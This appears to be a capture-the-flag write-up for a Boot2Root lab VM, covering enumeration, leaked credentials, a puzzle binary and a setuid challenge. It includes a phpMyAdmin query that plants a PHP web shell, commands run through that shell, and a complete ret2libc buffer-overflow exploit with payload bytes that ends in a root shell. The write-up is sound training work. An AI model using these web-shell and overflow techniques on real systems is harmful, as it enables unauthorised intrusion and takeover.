@@ -1,0 +1,740 @@
+# Boot to Root
+
+## Submission
+
+Create two virtual machines:
+
+- Boot 2 Root (target)
+- Parrot (attacker)
+
+Connect them through a Host-only Network
+
+On the virtual box interface -> network -> create
+
+Then for both virtual machines: Settings → Network → Adapter 1: Attached to: Host-only Network → Name: (the one we just created)
+
+Start both vms
+
+In parrot terminal 
+
+`ip a`
+
+Then I can see my Inet address on that network.
+
+I will use `nmap -sn 192.168.56.0/24` to list other machines on my network
+
+Then I can use `nmap -Pn -n --disable-arp-ping 192.168.56.101` to discover what ports are open and what services are open.
+
+The result will look like this:
+
+```bash
+[user@parrot]─[~]
+└──╼ $nmap -Pn -n --disable-arp-ping 192.168.56.101
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-05 13:38 UTC
+Nmap scan report for 192.168.56.101
+Host is up (0.00015s latency).
+Not shown: 994 closed tcp ports (conn-refused)
+PORT    STATE SERVICE
+21/tcp  open  ftp
+22/tcp  open  ssh
+80/tcp  open  http
+143/tcp open  imap
+443/tcp open  https
+993/tcp open  imaps
+```
+
+### Directory enumeration
+
+There is a program that can discover sub directories for a given URL call gobuster, we will use it to try common names:
+
+```bash
+$gobuster dir -u http://192.168.56.101/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
+```
+
+I did the same action but using https, I found `/phpmyadmin /webmail` and can access the forum. That uses my little forum.
+
+
+If the machine doesn't have gobuster we can do the same using ffuf that can be installed with:
+
+>pkcon install ffuf
+
+The wordlist can be downloaded from github (if your distro doesn't provide)
+
+>wget -q https://raw.githubusercontent.com/drtychai/wordlists/refs/heads/master/dirb/common.txt
+
+And to run:
+
+> ffuf -u https://192.168.56.101/FUZZ -w ./common.txt
+
+
+This will return the several entries amongs them is `/forum` 
+
+```
+cgi-bin/                [Status: 403, Size: 291, Words: 21, Lines: 11, Duration: 0ms]
+forum                   [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 0ms]
+phpmyadmin              [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 0ms]
+server-status           [Status: 403, Size: 296, Words: 21, Lines: 11, Duration: 0ms]
+webmail                 [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 0ms]
+```
+
+
+### Forum and webmail access
+
+When we read all the posts, we found one that have a log of a terminal and we can see that by accident the user expose his password.
+
+[Post that exposes the password](https://192.168.56.101/forum/index.php?id=6)
+
+> **Password:** `********` - author of the post and username in the session details: `lmezard`
+
+In the forum platform there is a option to send emails to another user. When I tried to use this I found lmezard email: `laurie@borntosec.net` and we can also see it in [user's profile](https://192.168.56.101/forum/index.php?mode=user&action=edit_profile) 
+
+I access the [webmail](https://192.168.56.101/webmail/src/login.php) using the email and password and worked.
+
+
+### phpMyAdmin → RCE via shell.php
+
+I found database credentials in one of the emails: `root` and `********`
+
+Once we connect to the database using [php my admin](https://192.168.56.101/phpmyadmin/) we can do this sql query to obtain a shell.
+```
+SELECT "<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>'; ?>" 
+INTO OUTFILE '/var/www/forum/templates_c/shell.php';
+```
+
+The browser endpoint can run a command such as `id` or `cat /etc/passwd`
+on the server. On the local VM, `id` returned
+`uid=33(www-data) gid=33(www-data)`: this is a useful foothold, but it is
+not root. An early reverse-shell attempt aimed at the school computer did
+not receive a callback, so this mandatory route continues through FTP and
+the account chain. The tested target-to-attacker callback through the PHP
+endpoint, with the attacker on the same VM network, is described in
+[the reverse-shell bonus candidate](./bonus/writeup5).
+
+### Lateral movement: lmezard → FTP
+
+[Running find command](https://192.168.56.101/forum/templates_c/shell.php?cmd=bash%20-c%20%22find%20/%20-iname%20%27*password*%27%202%3E/dev/null%22)
+
+`$ find / -iname '*password*' 2>/dev/null` will show an interesting file: …/LOOKATME/password
+
+[There are some credentials](https://192.168.56.101/forum/templates_c/shell.php?cmd=sh%20-c%20%22cat%20/home/LOOKATME/password%22)
+
+This is the user that I already have but with a different password. so I tried in the other service `FTP` 
+
+>pkcon install ftp
+
+>pkcon install lftp
+
+
+
+I can connect to `lftp lmezard@192.168.56.101` using the password that we found: `********`
+
+```
+user@parrot:~$ lftp lmezard@192.168.56.101
+Password: 
+lftp lmezard@192.168.56.101:~> ls                  
+-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
+-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
+```
+
+We use `get` command to download this two files to our machine.
+
+The readme file say that if we complete the challenge we have the password for laurie's ssh
+
+fun is a posix tar file (gnu) 
+
+to unzip we have to do `tar xvf fun`  
+
+Then we can use this bash to extract the password:
+
+```bash
+for f in *.pcap; do
+  n=$(grep -aoP '//file\K\d+' "$f")
+  [ -n "$n" ] && printf '%s\t%s\n' "$n" "$f"
+done | sort -n | cut -f2 | while read f; do
+  cat "$f"; echo    # the echo ensures the trailing \n missing at the end of each file
+done > raw.c
+
+perl -0777 -pe 's{/\*.*?\*/}{}gs; s{//[^\n]*}{}g' raw.c > result.c
+
+gcc -w result.c -o result && ./result
+```
+
+The output is:
+
+```text
+MY PASSWORD IS: ********
+Now SHA-256 it and submit
+```
+
+So we can sha-256:
+
+```bash
+$ read -r -s -p 'Phrase printed by fun: ' RECOVERED_PHRASE
+$ printf '%s' "$RECOVERED_PHRASE" | sha256sum
+********
+```
+
+### The binary bomb (laurie)
+
+we found a clue inside the readme:
+```
+laurie@BornToSecHackMe:~$ cat README 
+Diffuse this bomb!
+When you have all the password use it as "thor" user with ssh.
+
+HINT:
+P
+ 2
+ b
+
+o
+4
+
+NO SPACE IN THE PASSWORD (password is case sensitive).
+```
+
+Next we download this bomb file using scp into a current folder:
+
+`scp laurie@192.168.56.101:~/bomb ./`
+
+We can use ghidra to find the source code. 
+
+How to download ‘Ghidra’ : 
+
+1) On your 42 computer type Ghidra 
+2) software and then install 
+
+    using default set up works fine for this project with the binary file(can’t be loaded from sgoinfre folder)
+
+3) set up a work folder and open the file and double click it
+4) clicking inside directs you to the function that you look for
+
+for better hexa legibility, comparing with https://dogbolt.org/ 
+
+    Hex-Rays section helps much for certain phases. (This site also provides Ghidra interpretation)
+
+>Caution! All submitted binaries are saved and made available to any of the authors
+
+for each fase there is a corresponding function:
+
+**1.**
+
+```c
+void phase_1(undefined4 param_1)
+
+{
+  int iVar1;
+  
+  iVar1 = strings_not_equal(param_1,"Public speaking is very easy.");
+  if (iVar1 != 0) {
+    explode_bomb();
+  }
+  return;
+}
+```
+
+> **What it does:** `strings_not_equal` first compares lengths, then walks both strings byte by byte; it returns `0` only on an exact match.
+>
+> **Why `Public speaking is very easy.` works:** the function is a straight string comparison against that literal, so the input must match it character for character (including the trailing period) for `strings_not_equal` to return `0` and skip `explode_bomb()`.
+
+**2.**
+
+```c
+void phase_2(undefined4 param_1)
+
+{
+  int iVar1;
+  int numbers[7];
+  
+  read_six_numbers(param_1,numbers + 1);
+  if (aiStack_20[1] != 1) {
+    explode_bomb();
+  }
+  iVar1 = 1;
+  do {
+    if (aiStack_20[iVar1 + 1] != (iVar1 + 1) * aiStack_20[iVar1]) {
+      explode_bomb();
+    }
+    iVar1 = iVar1 + 1;
+  } while (iVar1 < 6);
+  return;
+}
+
+void read_six_numbers(char *param_1,int param_2)
+
+{
+  int iVar1;
+  
+  iVar1 = sscanf(param_1,"%d %d %d %d %d %d",param_2,param_2 + 4,param_2 + 8,param_2 + 0xc,
+                 param_2 + 0x10,param_2 + 0x14);
+  if (iVar1 < 6) {
+    explode_bomb();
+  }
+  return;
+}
+```
+
+> **What it does:** `read_six_numbers` parses six space-separated ints into `a[1..6]` (the `+1` offset means `a[0]`/the stack slot before it is unused padding). `phase_2` first demands `a[1] == 1`, then loops `i = 1..5` checking `a[i+1] == (i+1) * a[i]`.
+>
+> **Why `1 2 6 24 120 720` works:** starting from `a[1]=1`, each next value must be `(i+1)` times the previous one: `a[2]=2*1=2`, `a[3]=3*2=6`, `a[4]=4*6=24`, `a[5]=5*24=120`, `a[6]=6*120=720`. That recurrence is exactly the factorial sequence `1!, 2!, 3!, 4!, 5!, 6!`, so the answer is the first six factorials.
+
+**3.**
+
+```c
+void phase_3(char *param_1)
+
+{
+  int iVar1;
+  char cVar2;
+  undefined4 local_10;
+  char local_9;
+  int local_8;
+  
+  iVar1 = sscanf(param_1,"%d %c %d",&local_10,&local_9,&local_8);
+  if (iVar1 < 3) {
+    explode_bomb();
+  }
+  switch(local_10) {
+  case 0:
+    cVar2 = 'q';
+    if (local_8 != 0x309) {
+      explode_bomb();
+    }
+    break;
+  case 1:
+    cVar2 = 'b';
+    if (local_8 != 0xd6) {
+      explode_bomb();
+    }
+    break;
+  case 2:
+    cVar2 = 'b';
+    if (local_8 != 0x2f3) {
+      explode_bomb();
+    }
+    break;
+  case 3:
+    cVar2 = 'k';
+    if (local_8 != 0xfb) {
+      explode_bomb();
+    }
+    break;
+  case 4:
+    cVar2 = 'o';
+    if (local_8 != 0xa0) {
+      explode_bomb();
+    }
+    break;
+  case 5:
+    cVar2 = 't';
+    if (local_8 != 0x1ca) {
+      explode_bomb();
+    }
+    break;
+  case 6:
+    cVar2 = 'v';
+    if (local_8 != 0x30c) {
+      explode_bomb();
+    }
+    break;
+  case 7:
+    cVar2 = 'b';
+    if (local_8 != 0x20c) {
+      explode_bomb();
+    }
+    break;
+  default:
+    cVar2 = 'x';
+    explode_bomb();
+  }
+  if (cVar2 != local_9) {
+    explode_bomb();
+  }
+  return;
+}
+```
+
+> **What it does:** `sscanf` reads `%d %c %d` into `local_10` (int), `local_9` (char), `local_8` (int). A `switch` on `local_10` (valid range `0–7`, otherwise it explodes in `default`) assigns a specific expected character (`cVar2`) and checks `local_8` against a specific hex constant for that case. After the switch, it also requires `cVar2 == local_9`.
+>
+> **Why `1 b 214` works:** `local_10 = 1` selects `case 1`, which sets `cVar2 = 'b'` and requires `local_8 != 0xd6` to be false - i.e. `local_8` must equal `0xd6`, which is `214` in decimal. `local_9 = 'b'` then matches `cVar2`, satisfying the final check. All three parsed values (`1`, `b`, `214`) line up with what case 1 expects.
+
+**4.**
+
+```c
+void phase_4(char *param_1)
+
+{
+  int iVar1;
+  int local_8;
+  
+  iVar1 = sscanf(param_1,"%d",&local_8);
+  if ((iVar1 != 1) || (local_8 < 1)) {
+    explode_bomb();
+  }
+  iVar1 = func4(local_8);
+  if (iVar1 != 0x37) {
+    explode_bomb();
+  }
+  return;
+}
+
+int func4(int param_1)
+
+{
+  int iVar1;
+  int iVar2;
+  
+  if (param_1 < 2) {
+    iVar2 = 1;
+  }
+  else {
+    iVar1 = func4(param_1 + -1);
+    iVar2 = func4(param_1 + -2);
+    iVar2 = iVar2 + iVar1;
+  }
+  return iVar2;
+}
+
+```
+
+> **What it does:** `phase_4` parses a single positive int and requires `func4(local_8) == 0x37` (55 decimal). `func4` is recursive: for `param_1 < 2` it returns `1`; otherwise it returns `func4(n-1) + func4(n-2)` - a Fibonacci-style recurrence (with both base cases equal to `1`, so it's shifted by one position relative to the "standard" 0,1,1,2,3,5,... sequence).
+>
+> **Why `9` works:** tracing the recurrence gives `func4(1)=1, func4(2)=2, func4(3)=3, func4(4)=5, func4(5)=8, func4(6)=13, func4(7)=21, func4(8)=34, func4(9)=55`. Since `55 == 0x37`, `9` is the (smallest) input that makes `func4` return the required value.
+
+**5.**
+
+```c
+void phase_5(int param_1)
+
+{
+  int iVar1;
+  undefined1 local_c [6];
+  undefined1 local_6;
+  
+  iVar1 = string_length(param_1);
+  if (iVar1 != 6) {
+    explode_bomb();
+  }
+  iVar1 = 0;
+  do {
+    local_c[iVar1] = (&array.123)[(char)(*(byte *)(iVar1 + param_1) & 0xf)];
+    iVar1 = iVar1 + 1;
+  } while (iVar1 < 6);
+  local_6 = 0;
+  iVar1 = strings_not_equal(local_c,"giants");
+  if (iVar1 != 0) {
+    explode_bomb();
+  }
+  return;
+}
+undefined4 strings_not_equal(char *param_1,char *param_2)
+
+{
+  char cVar1;
+  int iVar2;
+  int iVar3;
+  undefined4 uVar4;
+  
+  iVar2 = string_length(param_1);
+  iVar3 = string_length(param_2);
+  if (iVar2 == iVar3) {
+    cVar1 = *param_1;
+    while (cVar1 != '\0') {
+      if (*param_1 != *param_2) goto LAB_08049057;
+      param_1 = param_1 + 1;
+      param_2 = param_2 + 1;
+      cVar1 = *param_1;
+    }
+    uVar4 = 0;
+  }
+  else {
+LAB_08049057:
+    uVar4 = 1;
+  }
+  return uVar4;
+}
+```
+
+> **What it does:** `phase_5` requires a 6-character input (`string_length == 6`). For each of the 6 bytes, it takes the byte's low nibble (`& 0xf`, so a value `0–15`) and uses it as an index into a lookup table (`array.123`) to produce one output character; the 6 resulting characters must equal `"giants"` exactly (checked with the same `strings_not_equal` from phase 1).
+>
+> **Why `opekmq` works:** each character of `opekmq` has a low nibble that, when used as an index into `array.123`, happens to map to the corresponding letter of `"giants"` (`o→g, p→i, e→a, k→n, m→t, q→s`). The table's actual contents aren't shown in this doc, so this explains the *mechanism* (nibble → table lookup → must spell "giants") rather than proving each lookup numerically - but any 6-char string whose low nibbles map that way through `array.123` would work.
+
+**6.**
+
+```c
+void phase_6(undefined4 param_1)
+
+{
+  int *piVar1;
+  int iVar2;
+  undefined1 *puVar3;
+  int *piVar4;
+  int iVar5;
+  undefined1 *local_38;
+  int *local_34;
+  int local_30 [5];
+  int local_1c [6];
+  
+  local_38 = node1;
+  read_six_numbers(param_1,local_1c);
+  iVar5 = 0;
+  do {
+    iVar2 = iVar5;
+    if (5 < local_1c[iVar5] - 1U) {
+      explode_bomb();
+    }
+    while (iVar2 = iVar2 + 1, iVar2 < 6) {
+      if (local_1c[iVar5] == local_1c[iVar2]) {
+        explode_bomb();
+      }
+    }
+    iVar5 = iVar5 + 1;
+  } while (iVar5 < 6);
+  iVar5 = 0;
+  do {
+    iVar2 = 1;
+    puVar3 = local_38;
+    if (1 < local_1c[iVar5]) {
+      do {
+        puVar3 = *(undefined1 **)(puVar3 + 8);
+        iVar2 = iVar2 + 1;
+      } while (iVar2 < local_1c[iVar5]);
+    }
+    local_30[iVar5 + -1] = (int)puVar3;
+    iVar5 = iVar5 + 1;
+  } while (iVar5 < 6);
+  iVar5 = 1;
+  piVar4 = local_34;
+  do {
+    piVar1 = (int *)local_30[iVar5 + -1];
+    piVar4[2] = (int)piVar1;
+    iVar5 = iVar5 + 1;
+    piVar4 = piVar1;
+  } while (iVar5 < 6);
+  piVar1[2] = 0;
+  iVar5 = 0;
+  do {
+    if (*local_34 < *(int *)local_34[2]) {
+      explode_bomb();
+    }
+    local_34 = (int *)local_34[2];
+    iVar5 = iVar5 + 1;
+  } while (iVar5 < 5);
+  return;
+}
+
+void read_six_numbers(char *param_1,int param_2)
+
+{
+  int iVar1;
+  
+  iVar1 = sscanf(param_1,"%d %d %d %d %d %d",param_2,param_2 + 4,param_2 + 8,param_2 + 0xc,
+                 param_2 + 0x10,param_2 + 0x14);
+  if (iVar1 < 6) {
+    explode_bomb();
+  }
+  return;
+}
+
+```
+
+> **What it does:** `phase_6` reads six numbers and first validates they are a permutation of `1–6`: each value must be in range `1–6` (`local_1c[i] - 1U <= 5`) and no two values may repeat (the nested loop checks every pair for equality). It then walks the `node1` linked list, using each input number as a 1-based "depth" (how many `next` pointers to follow) to pick a node, and stores those six node pointers in the order given by the input. Next it relinks the nodes into a new list in exactly that order (each node's `next` now points to the next entry in `local_30`, with the last node's `next` set to `NULL`). Finally it walks the *relinked* list and explodes if any node's value is smaller than the next node's value - i.e. the resulting list's values must be non-increasing (sorted descending, or equal).
+>
+> **Why `4 2 6 3 1 5` works:** it's a valid permutation of `1–6` (passes the range/uniqueness check), and when used to pick-and-relink the six `node1` nodes in that order, the resulting chain's values come out in non-increasing order. The exact numeric values stored in `node1` aren't shown in this doc, so this explains the *mechanism* (permutation → reorder the fixed node list → must end up sorted descending) rather than reconstructing `node1`'s contents - but any permutation that sorts those underlying node values from largest to smallest would satisfy the check, and `4 2 6 3 1 5` is the one found to work.
+
+### Bomb answers
+
+| Phase | Answer |
+| --- | --- |
+| 1 | `Public speaking is very easy.` |
+| 2 | `1 2 6 24 120 720` |
+| 3 | `1 b 214` |
+| 4 | `9` |
+| 5 | `opekmq` |
+| 6 | `4 2 6 3 1 5` |
+
+Thor password, assembled from them - concatenate with no spaces and swap the two significant characters, 426315 → 426135 (as per the subject)
+
+> `********`
+
+```bash
+laurie@BornToSecHackMe:~$ su - thor
+Password: 
+thor@BornToSecHackMe:~$ ll
+total 41
+drwxr-x--- 1 thor     thor    60 Oct 15  2015 ./
+drwxrwx--x 1 www-data root   120 Oct 13  2015 ../
+-rwxr-x--- 1 thor     thor    16 Oct  3 16:11 .bash_history*
+-rwxr-x--- 1 thor     thor   220 Oct  8  2015 .bash_logout*
+-rwxr-x--- 1 thor     thor  3489 Oct 13  2015 .bashrc*
+drwx------ 2 thor     thor    43 Oct 15  2015 .cache/
+-rwxr-x--- 1 thor     thor   675 Oct  8  2015 .profile*
+-rwxr-x--- 1 thor     thor    69 Oct  8  2015 README*
+-rwxr-x--- 1 thor     thor 31523 Oct  8  2015 turtle*
+```
+
+The readme gives as a direction:
+
+```bash
+thor@BornToSecHackMe:~$ cat README 
+Finish this challenge and use the result as password for 'zaz' user.
+```
+
+### Pivoting to thor: the turtle file
+
+In Thor's directory we found `turtle`. I copied it to the attacker VM and
+ran the reviewed [Turtle solver script](./scripts/turtle.py) in a graphical
+Python session:
+
+```sh
+scp thor@192.168.56.101:/home/thor/turtle ./turtle
+python3 scripts/turtle.py ./turtle
+```
+
+The script reads the downloaded file and draws its instructions. Its path
+argument makes the same command work regardless of the attacker's home
+directory.
+
+The turtle solver draws a message. Its exact text is masked here.
+
+At the end of turtle there is the message `Can you digest the message? :)` 
+
+As the README hints, hash that message and use the resulting digest as
+`zaz`'s password. Enter the message without echoing it during evaluation:
+
+```sh
+read -r -s -p 'Turtle message: ' TURTLE_MESSAGE
+printf '\n'
+printf '%s' "$TURTLE_MESSAGE" | md5sum
+unset TURTLE_MESSAGE
+```
+
+The resulting digest is masked here: `********`.
+
+### From zaz to root: return-to-libc
+
+The turtle result gets us to `zaz`, not root. On the running BornToSec VM I
+confirmed the account and inspected the program in its home directory.
+
+```text
+zaz@BornToSecHackMe:~$ id
+uid=1005(zaz) gid=1005(zaz) groups=1005(zaz)
+zaz@BornToSecHackMe:~$ ls -l /home/zaz/exploit_me
+-rwsr-s--- 1 root zaz 4880 Oct  8  2015 /home/zaz/exploit_me
+zaz@BornToSecHackMe:~$ file /home/zaz/exploit_me
+/home/zaz/exploit_me: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x2457e2f88d6a21c3893bc48cb8f2584bcd39917e, not stripped
+zaz@BornToSecHackMe:~$ readelf -h /home/zaz/exploit_me | grep Type:
+  Type:                              EXEC (Executable file)
+zaz@BornToSecHackMe:~$ cat /proc/sys/kernel/randomize_va_space
+0
+```
+
+The setuid bit makes the program run with effective UID 0. Its executable
+type is fixed-address, and this VM has address randomization disabled. Neither
+fact alone makes us root: we still need to redirect the program's control
+flow. These selected disassembly lines show why that is possible:
+
+```text
+zaz@BornToSecHackMe:~$ objdump -d -M intel /home/zaz/exploit_me | grep -E '<main>:|80483fa:|8048419:|8048420:|8048436:|8048437:'
+080483f4 <main>:
+ 80483fa: sub    esp,0x90
+ 8048419: lea    eax,[esp+0x10]
+ 8048420: call   8048300 <strcpy@plt>
+ 8048436: leave
+ 8048437: ret
+```
+
+`strcpy` copies our first argument to a stack buffer without a length
+check. To measure where the saved return address starts, I ran the program
+under GDB with 140 `A` bytes followed by four `B` bytes. GDB is used
+only to measure the overwrite; the final identity check is in a normal
+setuid process. Alternatively, we can use the [offset calculator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/).
+
+```text
+zaz@BornToSecHackMe:~$ gdb -q /home/zaz/exploit_me
+(gdb) run $(python -c 'print "A" * 140 + "BBBB"')
+(gdb) info registers eip esp ebp
+```
+
+```text
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+eip            0x42424242
+```
+
+`0x42` is ASCII `B`, so byte 140 is the first byte of the saved return
+address. I then resolved the functions and the `/bin/sh` string in the
+target's own libc:
+
+```text
+(gdb) break main
+(gdb) run AAA
+(gdb) p/x (void *)system
+(gdb) p/x (void *)exit
+(gdb) info proc mappings
+(gdb) quit
+zaz@BornToSecHackMe:~$ strings -t x /lib/i386-linux-gnu/libc.so.6 | grep -m1 /bin/sh
+```
+
+```text
+system = 0xb7e6b060
+exit   = 0xb7e5ebe0
+libc mapping starts at 0xb7e2c000
+/bin/sh has libc file offset 0x160c58
+0xb7e2c000 + 0x160c58 = 0xb7f8cc58
+```
+
+The generator [exploit_me.py](./scripts/exploit_me.py) packs the three addresses
+in little-endian order after the 140-byte padding:
+
+```text
+[140 bytes padding][system address][exit address][/bin/sh address]
+```
+
+When `main` returns, it enters `system("/bin/sh")`. The next word is the
+return address for `system`, and the word after that is its string argument.
+To reproduce the run, copy the reviewed source files from the attacker VM
+to `zaz`'s home directory, then execute the generator on the target:
+
+```sh
+scp scripts/exploit_me.py scripts/promote_root.py zaz@192.168.56.101:/home/zaz/
+ssh -t zaz@192.168.56.101
+python /home/zaz/exploit_me.py ret2libc
+```
+OR 
+
+```sh
+./exploit_me "$(printf 'A%.0s' {1..140}; printf '\x60\xb0\xe6\xb7\xe0\xeb\xe5\xb7\x58\xcc\xf8\xb7')"
+```
+
+The spawned shell initially had effective UID 0 and real UID 1005. This is
+why the final command matters: [promote_root.py](./scripts/promote_root.py)
+uses the shell's effective root privilege to set its groups, GID, and UID to
+0, then replaces itself with a real `/bin/sh`. My interactive result was:
+
+```text
+# id -u
+0
+# whoami
+root
+# id -ru
+1005
+# python /home/zaz/promote_root.py
+# id -u
+0
+# whoami
+root
+# id -ru
+0
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+This is a shell on the server, not a database session or a command endpoint.
+The generated addresses are valid for the observed VM state; repeat the
+offset and libc checks if a defense VM reports different mappings.
+
+**Reproduction check:** start as `zaz`; confirm the setuid bit, offset
+`140`, and target libc addresses; run the source generator without a
+debugger; finish with `id -u` returning `0`, `whoami` returning `root`,
+and `id -ru` returning `0`.
